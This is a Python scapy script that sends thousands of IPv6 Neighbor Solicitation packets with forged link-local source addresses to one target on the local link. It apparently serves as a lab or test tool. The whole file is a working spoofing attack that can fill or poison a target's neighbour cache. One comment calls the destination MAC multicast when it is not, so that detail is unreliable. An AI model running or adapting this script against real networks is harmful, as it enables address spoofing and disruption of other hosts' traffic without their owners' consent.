from scapy.all import get_if_hwaddr, sendp
import time
from scapy.layers.inet6 import IPv6, Ether, ICMPv6ND_NS
import psutil
import socket
import random

# Parameters
INTERFACE = "eth0"
PACKET_COUNT = 3333
random.seed(100)

# Allowed last two hex values for spoofing
SPOOFED_SUFFIXES = ["66", "67", "68", "69", "6a", "6b"]

def get_link_local_ipv6(interface_name):
    """Retrieve the link-local IPv6 address of the given interface."""
    try:
        addresses = psutil.net_if_addrs()
        if interface_name not in addresses:
            raise ValueError(f"Interface '{interface_name}' not found.")

        for address in addresses[interface_name]:
            if address.family == socket.AF_INET6:
                ipv6_address = address.address.split('%')[0]  # Remove zone index
                if ipv6_address.startswith("fe80"):
                    return ipv6_address
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def generate_spoofed_ipv6():
    """Generate a spoofed link-local IPv6 address by modifying the last two hex digits."""
    base_ipv6 = "fe80::1:1ff:fe01:"  # Keep the base prefix
    suffix = random.choice(SPOOFED_SUFFIXES)  # Choose a random last two hex digits
    return f"{base_ipv6}{suffix}"  # Construct the spoofed IPv6 address

def send_ns_packets(target_ip, interval=1):
    """Send spoofed Neighbor Solicitation (NS) packets to a target IPv6 address."""
    src_mac = get_if_hwaddr(INTERFACE)  # Get source MAC address
    current_suffix = src_mac[-2:]
    SPOOFED_SUFFIXES.remove(current_suffix)

    print(f"Source MAC: {src_mac}")

    for i in range(PACKET_COUNT):
        spoofed_ip = generate_spoofed_ipv6()  # Generate spoofed IPv6 address

        print(f"Sending packet {i+1}/{PACKET_COUNT} with spoofed source: {spoofed_ip}")

        # Construct the NS packet
        packet = (
            Ether(src=src_mac, dst="02:01:01:01:00:01")  # NS uses multicast MAC
            / IPv6(src=spoofed_ip, dst=target_ip)
            / ICMPv6ND_NS(tgt=target_ip)  # Target IPv6
        )

        sendp(packet, iface=INTERFACE, verbose=False)
        time.sleep(interval)  # 1-second delay

if __name__ == "__main__":
    send_ns_packets("fe80::1:1ff:fe01:1")  # Target is a link-local IPv6
